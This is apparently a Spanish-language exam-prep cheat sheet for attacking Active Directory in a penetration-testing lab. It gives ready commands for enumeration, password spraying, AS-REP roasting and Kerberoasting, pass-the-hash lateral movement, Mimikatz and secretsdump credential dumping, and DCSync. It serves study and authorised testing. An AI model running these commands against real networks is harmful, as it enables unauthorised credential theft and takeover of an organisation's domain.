# 6. Active Directory (40 puntos — prioridad alta)

Flujo típico: foothold en máquina 1 → dump de creds → enumerar con BloodHound → Kerberoast/AS-REP → movimiento lateral → DC → DCSync.

## Enumeración con credenciales (aunque sean de bajo privilegio)
```bash
nxc smb <DC_IP> -u <USER> -p <PASS> --users
nxc smb <DC_IP> -u <USER> -p <PASS> --groups
nxc smb <SUBNET>/24 -u <USER> -p <PASS>        # valida/spray en toda la red
nxc smb <DC_IP> -u <USER> -p <PASS> --shares

# Enumeración externa (sin creds)
impacket-rpcclient -U "" -N <IP>
impacket-samrdump <DOMAIN>/<USER>:<PASS>@<IP>
```

## Enumeración nativa desde dentro (RDP + herramientas de Windows)

> No siempre vas a poder correr `nxc`/`impacket`/`bloodhound-python` limpio desde Kali (firewalls que solo dejan pasar RDP, por ejemplo). Este es tu plan B: conéctate por RDP con las credenciales del breach scenario y enumera con las herramientas nativas de Windows desde dentro.

```bash
# Conectarse por RDP a un cliente del dominio con credenciales ya obtenidas
xfreerdp /u:<USER> /d:<DOMAIN> /v:<IP_CLIENTE> +clipboard
# Te pedirá la contraseña interactivamente, o pásala con /p:<PASS>
```

Una vez dentro (cmd o PowerShell), enumeración con herramientas **legacy** de Windows:
```cmd
:: Info del dominio y del usuario actual
whoami /all
echo %USERDOMAIN%
systeminfo | findstr /B /C:"Domain"

:: Usuarios y grupos del dominio
net user /domain
net user <USUARIO> /domain          :: detalle de un usuario específico
net group /domain
net group "Domain Admins" /domain   :: miembros de un grupo específico
net localgroup administrators       :: admins locales de la máquina actual

:: Controladores de dominio
nltest /dclist:<DOMAIN>

:: Confianzas de dominio
nltest /domain_trusts
```
```powershell
# PowerShell nativo (sin necesitar módulos externos como PowerView)
Get-ADUser -Filter * -Properties *              # si el módulo AD de RSAT está disponible
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

**Cuándo usar este enfoque en vez de tu flujo normal de Kali:**
- El firewall solo permite RDP (3389) hacia ese segmento, no SMB/RPC directo.
- Quieres confirmar manualmente lo que ya viste en BloodHound, desde la perspectiva "nativa" de un usuario real del dominio.
- Necesitas ejecutar herramientas que requieren estar dentro de la sesión gráfica (ej: ver contraseñas guardadas en `cmdkey /list`, revisar archivos accesibles solo desde esa sesión).

## BloodHound (te dibuja el camino a Domain Admin — casi obligatorio)
```bash
# Recolección remota desde Kali
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c all

# O SharpHound en la máquina Windows comprometida (o dentro de tu sesión RDP)
.\SharpHound.exe -c All
```
Importa el ZIP a BloodHound y mira "Shortest Paths to Domain Admins".

## Ataques Kerberos
```bash
# AS-REP Roasting (usuarios sin preauth) → crackear con hashcat -m 18200
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -request

# Kerberoasting (SPNs) → crackear con hashcat -m 13100
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
```

## Password spraying (¡cuidado con lockout!)
```bash
nxc smb <SUBNET>/24 -u users.txt -p 'Password123'
```

## Movimiento lateral (con creds o hash)
```bash
impacket-psexec  <DOMAIN>/<USER>:<PASS>@<IP>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>
evil-winrm -i <IP> -u <USER> -p <PASS>

# Pass-the-Hash
impacket-psexec <DOMAIN>/<USER>@<IP> -hashes <LM>:<NT>
evil-winrm -i <IP> -u <USER> -H <NT_HASH>
nxc smb <IP> -u <USER> -H <NT_HASH>
```

## Dump de credenciales
```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
nxc smb <IP> -u <USER> -p <PASS> --sam --lsa

# Mimikatz (en la máquina)
sekurlsa::logonpasswords
lsadump::sam
```

## Escalada a Domain Admin
```bash
# DCSync (si tienes derechos de replicación)
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>
```
También: abuso de ACLs (BloodHound), delegaciones, Pass-the-Ticket.

> Recordatorio de reglas: Responder solo en modo análisis, **nunca poisoning**. Metasploit no para pivotar (ver 7-Pivoting).

---

Ver también: **6b-AD-Edges-Metodologia.md** — el plan de arranque con `nxc`/`Pwn3d!`, la tabla de edges de BloodHound, y el orden de priorización de caminos (ACL > Kerberos > Sesión).
